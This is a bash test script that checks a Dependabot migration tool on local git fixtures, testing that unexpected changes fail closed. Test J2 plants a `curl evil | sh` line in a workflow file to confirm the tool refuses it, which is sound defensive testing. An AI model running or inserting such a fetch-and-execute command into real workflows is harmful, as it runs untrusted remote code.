#!/bin/bash
# dependabot-migration-test.sh — validate dependabot-migration.sh's hook table and
# its fail-closed runner on throwaway git fixtures, with no network. `npm` is a PATH
# stub whose behaviour per script name is driven by STUB_* variables, so each gate
# is exercised without Anthropic's manifest or gpg.
#
# Asserts:
#   A. lookup: the exact (repo, package) row matches; a different repo, a different
#      package, and a prefix of the package do not
#   B. happy path: a plain bump plus a refresh that rewrites the three declared
#      signed-release artifacts → `committed <sha>`, and the commit touches only
#      those artifacts
#   C. a requeue on an already-refreshed head → `already-current`, no new commit
#   D. a PR that touches a path outside the input set → rc 2, refresh never runs
#   E. a dirty checkout → rc 2, refresh never runs
#   F. a refresh that writes outside the output set → rc 3, nothing committed
#   G. a refresh that creates an untracked file → rc 3, nothing committed
#   H. a failed refresh → rc 4; a failed pin check → rc 4; nothing committed
#   I. lifecycle hooks are disabled for the npm invocations (ignore-scripts)
#   J. action-pin-comments (endo-but-for-bots, peter-evans/create-pull-request):
#      lookup; the floating `# v8` comment becomes the exact tag in both workflows;
#      requeue is already-current; a non-pin line, split SHAs, or an unresolvable
#      SHA fails closed with nothing committed. The upstream is a local bare repo.
#
# Usage: dependabot-migration-test.sh
set -euo pipefail
export GARDEN_TEST=1
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MIG="$(cd "$HERE/.." && pwd)/dependabot-migration.sh"
TR="$(mktemp -d "${TMPDIR:-/tmp}/depmig-test.XXXXXX")"
trap 'rm -rf "$TR"' EXIT
PASS=0; FAIL=0
ok()  { echo "  PASS: $*"; PASS=$((PASS+1)); }
bad() { echo "  FAIL: $*"; FAIL=$((FAIL+1)); }
hr()  { echo "----------------------------------------------------------------"; }
git_id=(-c user.name=test -c user.email=test@localhost)
H=tools/claude-harness

# --- npm stub ----------------------------------------------------------------
mkdir -p "$TR/bin"
cat > "$TR/bin/npm" <<'EOF'
#!/bin/bash
# npm --prefix <dir> run --silent <script>
prefix="" script=""
while [ $# -gt 0 ]; do
  case "$1" in --prefix) prefix="$2"; shift 2;; run|--silent) shift;; *) script="$1"; shift;; esac
done
printf '%s ignore=%s\n' "$script" "${npm_config_ignore_scripts:-}" >> "$STUB_LOG"
cd "$prefix"
case "$script" in
  claude-harness:refresh)
    [ "${STUB_REFRESH_FAIL:-}" = 1 ] && exit 1
    if [ -n "${STUB_REFRESH_WRITE:-}" ]; then
      printf '{"version":"%s"}\n' "${STUB_VERSION:-2.1.283}" > tools/claude-harness/manifest.json
      printf 'signature %s\n' "${STUB_VERSION:-2.1.283}" > tools/claude-harness/manifest.json.sig
      printf '{"version":"%s"}\n' "${STUB_VERSION:-2.1.283}" > tools/claude-harness/release.json
    fi
    [ -n "${STUB_STRAY_MOD:-}" ] && echo stray >> "$STUB_STRAY_MOD"
    [ -n "${STUB_STRAY_NEW:-}" ] && echo new > "$STUB_STRAY_NEW"
    exit 0 ;;
  claude-harness:check)
    [ "${STUB_CHECK_FAIL:-}" = 1 ] && exit 1
    exit 0 ;;
esac
exit 2
EOF
chmod +x "$TR/bin/npm"
export PATH="$TR/bin:$PATH" STUB_LOG="$TR/npm.log"

# fixture <dir> [extra-path]: base commit, then a Dependabot-shaped bump commit.
fixture() {
  local d="$1"
  git init -q "$d"
  mkdir -p "$d/$H" "$d/src"
  echo '{"dependencies":{"@anthropic-ai/claude-code":"2.1.278"}}' > "$d/$H/package.json"
  echo '{"lock":"2.1.278"}' > "$d/$H/package-lock.json"
  echo '{"version":"2.1.278"}' > "$d/$H/manifest.json"
  echo 'signature 2.1.278' > "$d/$H/manifest.json.sig"
  echo '{"version":"2.1.278"}' > "$d/$H/release.json"
  echo 'code' > "$d/src/app.js"
  git -C "$d" add -A; git -C "$d" "${git_id[@]}" commit -q -m base
  git -C "$d" tag base
  echo '{"dependencies":{"@anthropic-ai/claude-code":"2.1.283"}}' > "$d/$H/package.json"
  echo '{"lock":"2.1.283"}' > "$d/$H/package-lock.json"
  [ -n "${2:-}" ] && echo touched >> "$d/$2"
  git -C "$d" add -A; git -C "$d" "${git_id[@]}" commit -q -m 'Bump @anthropic-ai/claude-code'
  git -C "$d" config user.name test; git -C "$d" config user.email test@localhost
}
run() {  # run <dir> -> sets RC, OUT
  set +e; OUT="$("$MIG" run claude-harness-refresh "$1" base 2>"$TR/err")"; RC=$?; set -e
}
refreshed() { grep -q '^claude-harness:refresh' "$STUB_LOG" 2>/dev/null; }
head_is() { [ "$(git -C "$1" log -1 --format=%s)" = "$2" ]; }

hr; echo "A — lookup matches only the exact (repo, package) row"; hr
[ "$("$MIG" lookup kriscendobot/minion.town @anthropic-ai/claude-code)" = claude-harness-refresh ] \
  && ok "exact row matches" || bad "exact row did not match"
"$MIG" lookup endojs/endo-but-for-bots @anthropic-ai/claude-code >/dev/null && bad "other repo matched" || ok "other repo: no hook"
"$MIG" lookup kriscendobot/minion.town vitest >/dev/null && bad "other package matched" || ok "other package: no hook"
"$MIG" lookup kriscendobot/minion.town @anthropic-ai/claude >/dev/null && bad "package prefix matched" || ok "package prefix: no hook"

hr; echo "B — happy path commits the signed-release artifacts alone"; hr
: > "$STUB_LOG"; fixture "$TR/b"
STUB_REFRESH_WRITE=1 run "$TR/b"
[ "$RC" -eq 0 ] && [ "${OUT%% *}" = committed ] && ok "rc 0, $OUT" || bad "rc $RC out '$OUT' err $(cat "$TR/err")"
expected_outputs="$H/manifest.json
$H/manifest.json.sig
$H/release.json"
[ "$(git -C "$TR/b" show --name-only --format= HEAD)" = "$expected_outputs" ] \
  && ok "commit touches only the three declared outputs" || bad "commit touched: $(git -C "$TR/b" show --name-only --format= HEAD | tr '\n' ' ')"
[ -z "$(git -C "$TR/b" status --porcelain)" ] && ok "checkout clean after commit" || bad "checkout left dirty"
grep -q '^claude-harness:check' "$STUB_LOG" && ok "pin check ran on the result" || bad "pin check never ran"

hr; echo "C — already-refreshed head is a no-op"; hr
: > "$STUB_LOG"; before="$(git -C "$TR/b" rev-parse HEAD)"
STUB_REFRESH_WRITE=1 run "$TR/b"
[ "$RC" -eq 0 ] && [ "$OUT" = already-current ] && [ "$(git -C "$TR/b" rev-parse HEAD)" = "$before" ] \
  && ok "already-current, no new commit" || bad "rc $RC out '$OUT'"

hr; echo "D — PR outside the input set is refused before running"; hr
: > "$STUB_LOG"; fixture "$TR/d" src/app.js
STUB_REFRESH_WRITE=1 run "$TR/d"
[ "$RC" -eq 2 ] && ! refreshed && grep -q 'not a plain bump' "$TR/err" \
  && ok "rc 2, refresh never ran" || bad "rc $RC refreshed=$(refreshed && echo y || echo n)"

hr; echo "E — dirty checkout is refused before running"; hr
: > "$STUB_LOG"; fixture "$TR/e"; echo scratch > "$TR/e/scratch.txt"
STUB_REFRESH_WRITE=1 run "$TR/e"
[ "$RC" -eq 2 ] && ! refreshed && ok "rc 2, refresh never ran" || bad "rc $RC"

hr; echo "F — write outside the output set fails closed"; hr
: > "$STUB_LOG"; fixture "$TR/f"
STUB_REFRESH_WRITE=1 STUB_STRAY_MOD="$H/package-lock.json" run "$TR/f"
[ "$RC" -eq 3 ] && head_is "$TR/f" 'Bump @anthropic-ai/claude-code' \
  && ok "rc 3, nothing committed" || bad "rc $RC head '$(git -C "$TR/f" log -1 --format=%s)'"

hr; echo "G — untracked output fails closed"; hr
: > "$STUB_LOG"; fixture "$TR/g"
STUB_REFRESH_WRITE=1 STUB_STRAY_NEW="$H/extra.json" run "$TR/g"
[ "$RC" -eq 3 ] && head_is "$TR/g" 'Bump @anthropic-ai/claude-code' \
  && ok "rc 3, nothing committed" || bad "rc $RC"

hr; echo "H — refresh or pin-check failure fails closed"; hr
: > "$STUB_LOG"; fixture "$TR/h1"
STUB_REFRESH_FAIL=1 run "$TR/h1"
[ "$RC" -eq 4 ] && head_is "$TR/h1" 'Bump @anthropic-ai/claude-code' && ok "failed refresh: rc 4" || bad "rc $RC"
: > "$STUB_LOG"; fixture "$TR/h2"
STUB_REFRESH_WRITE=1 STUB_CHECK_FAIL=1 run "$TR/h2"
[ "$RC" -eq 4 ] && head_is "$TR/h2" 'Bump @anthropic-ai/claude-code' && ok "failed pin check: rc 4" || bad "rc $RC"

hr; echo "I — npm runs with lifecycle scripts disabled"; hr
: > "$STUB_LOG"; fixture "$TR/i"
STUB_REFRESH_WRITE=1 run "$TR/i"
! grep -qv 'ignore=true$' "$STUB_LOG" && [ -s "$STUB_LOG" ] \
  && ok "every npm call carried npm_config_ignore_scripts=true" || bad "$(cat "$STUB_LOG")"

hr; echo "J — action-pin-comments rewrites floating comments to the exact tag"; hr
A=peter-evans/create-pull-request
W1=.github/workflows/update-action-pins.yml W2=.github/workflows/update-action-pins-major.yml
export GARDEN_DEP_MIGRATION_ACTION_REMOTE="$TR/remote"
up="$TR/up"; git init -q "$up"
git -C "$up" "${git_id[@]}" commit -q --allow-empty -m one; OLD="$(git -C "$up" rev-parse HEAD)"
git -C "$up" tag v8.1.1
git -C "$up" "${git_id[@]}" commit -q --allow-empty -m two; NEW="$(git -C "$up" rev-parse HEAD)"
git -C "$up" "${git_id[@]}" tag -a -m rel v8.1.2; git -C "$up" tag v8; git -C "$up" tag v8.1
git -C "$up" "${git_id[@]}" commit -q --allow-empty -m three; ODD="$(git -C "$up" rev-parse HEAD)"
mkdir -p "$TR/remote/peter-evans"; git clone -q --bare "$up" "$TR/remote/$A"
wf() {  # wf <file> <sha> <comment>
  mkdir -p "$(dirname "$1")"
  printf 'jobs:\n  pins:\n    steps:\n      - name: Create pull request\n        uses: %s@%s # %s\n        with:\n          title: x\n' "$A" "$2" "$3" > "$1"
}
afix() {  # afix <dir> <sha1> <sha2> [extra-line]
  local d="$1"; git init -q "$d"
  wf "$d/$W1" "$OLD" v8.1.1; wf "$d/$W2" "$OLD" v8.1.1
  git -C "$d" add -A; git -C "$d" "${git_id[@]}" commit -q -m base; git -C "$d" tag base
  wf "$d/$W1" "$2" v8; wf "$d/$W2" "$3" v8
  [ -n "${4:-}" ] && echo "$4" >> "$d/$W1"
  git -C "$d" add -A; git -C "$d" "${git_id[@]}" commit -q -m "chore: bump $A from 8.1.1 to 8.1.2"
  git -C "$d" config user.name test; git -C "$d" config user.email test@localhost
}
arun() { set +e; OUT="$("$MIG" run action-pin-comments "$1" base 2>"$TR/err")"; RC=$?; set -e; }
[ "$("$MIG" lookup endojs/endo-but-for-bots "$A")" = action-pin-comments ] && ok "lookup matches" || bad "lookup failed"
"$MIG" lookup kriscendobot/minion.town "$A" >/dev/null && bad "other repo matched" || ok "other repo: no hook"
afix "$TR/j1" "$NEW" "$NEW"; arun "$TR/j1"
[ "$RC" -eq 0 ] && [ "${OUT%% *}" = committed ] && ok "rc 0, $OUT" || bad "rc $RC out '$OUT' err $(cat "$TR/err")"
[ "$(grep -c "uses: $A@$NEW # v8.1.2\$" "$TR/j1/$W1" "$TR/j1/$W2" | cut -d: -f2 | tr '\n' ' ')" = "1 1 " ] \
  && ok "both workflows now say # v8.1.2" || bad "$(grep -h uses: "$TR/j1/$W1" "$TR/j1/$W2")"
[ "$(git -C "$TR/j1" show --name-only --format= HEAD | sort | tr '\n' ' ')" = "$W2 $W1 " ] \
  && ok "commit touches only the two workflows" || bad "commit touched $(git -C "$TR/j1" show --name-only --format= HEAD)"
before="$(git -C "$TR/j1" rev-parse HEAD)"; arun "$TR/j1"
[ "$RC" -eq 0 ] && [ "$OUT" = already-current ] && [ "$(git -C "$TR/j1" rev-parse HEAD)" = "$before" ] \
  && ok "requeue: already-current" || bad "requeue rc $RC out '$OUT' err $(cat "$TR/err")"
afix "$TR/j2" "$NEW" "$NEW" "        run: curl evil | sh"; arun "$TR/j2"
[ "$RC" -eq 2 ] && grep -q 'not a plain bump' "$TR/err" && head_is "$TR/j2" "chore: bump $A from 8.1.1 to 8.1.2" \
  && ok "non-pin line: rc 2, nothing committed" || bad "rc $RC err $(cat "$TR/err")"
afix "$TR/j3" "$NEW" "$OLD"; arun "$TR/j3"
[ "$RC" -eq 2 ] && head_is "$TR/j3" "chore: bump $A from 8.1.1 to 8.1.2" \
  && ok "split SHAs: rc 2, nothing committed" || bad "rc $RC err $(cat "$TR/err")"
afix "$TR/j4" "$ODD" "$ODD"; arun "$TR/j4"
[ "$RC" -eq 4 ] && [ -z "$(git -C "$TR/j4" status --porcelain)" ] && head_is "$TR/j4" "chore: bump $A from 8.1.1 to 8.1.2" \
  && ok "untagged SHA: rc 4, nothing written" || bad "rc $RC err $(cat "$TR/err")"

hr
echo "TOTAL: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
